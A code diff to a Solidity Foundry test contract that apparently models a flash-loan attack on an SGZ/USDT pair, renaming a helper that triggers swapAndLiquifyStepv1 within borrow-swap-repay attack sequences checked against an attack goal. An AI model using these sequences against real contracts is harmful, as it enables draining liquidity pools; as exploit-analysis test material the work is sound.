@@ -153,7 +153,7 @@ contract SGZTest is Test, BlockLoader {
         pair.sync();
     }
 
-    function breaklr_sgz_pair() internal {
+    function breaklr_pair_sgz() internal {
         sgz.swapAndLiquifyStepv1();
     }
 
@@ -162,7 +162,7 @@ contract SGZTest is Test, BlockLoader {
         printBalance("After step0 ");
         swap_pair_usdt_sgz(usdt.balanceOf(attacker));
         printBalance("After step1 ");
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         printBalance("After step2 ");
         swap_pair_sgz_usdt(sgz.balanceOf(attacker));
         printBalance("After step3 ");
@@ -180,7 +180,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt3 == amt0 + 300000000000000006);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         swap_pair_sgz_usdt(amt2);
         payback_usdt(amt3);
         assert(!attackGoal());
@@ -195,7 +195,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt3 == amt0 + 300000000000000006);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         swap_pair_sgz_usdt(amt2);
         payback_usdt(amt3);
         assert(!attackGoal());
@@ -210,7 +210,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt3 == amt0 + 300000000000000006);
         borrow_sgz(amt0);
         swap_pair_sgz_usdt(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         swap_pair_usdt_sgz(amt2);
         payback_sgz(amt3);
         assert(!attackGoal());
@@ -226,7 +226,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt4 == amt0 + 300000000000000006);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         swap_pair_sgz_usdt(amt2);
         swap_pair_sgz_usdt(amt3);
         payback_usdt(amt4);
@@ -242,7 +242,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt3 == amt0 + 300000000000000006);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         sync_pair();
         swap_pair_sgz_usdt(amt2);
         payback_usdt(amt3);
@@ -259,7 +259,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt4 == amt0 + 300000000000000006);
         borrow_sgz(amt0);
         swap_pair_sgz_usdt(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         swap_pair_usdt_sgz(amt2);
         swap_pair_sgz_usdt(amt3);
         payback_sgz(amt4);
@@ -275,7 +275,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt3 == amt0 + 300000000000000006);
         borrow_sgz(amt0);
         swap_pair_sgz_usdt(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         sync_pair();
         swap_pair_usdt_sgz(amt2);
         payback_sgz(amt3);
@@ -292,7 +292,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt4 == amt0 + 300000000000000006);
         borrow_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         sync_pair();
         swap_pair_sgz_usdt(amt2);
         swap_pair_sgz_usdt(amt3);
@@ -310,7 +310,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt4 == amt0 + 300000000000000006);
         borrow_sgz(amt0);
         swap_pair_sgz_usdt(amt1);
-        breaklr_sgz_pair();
+        breaklr_pair_sgz();
         sync_pair();
         swap_pair_usdt_sgz(amt2);
         swap_pair_sgz_usdt(amt3);
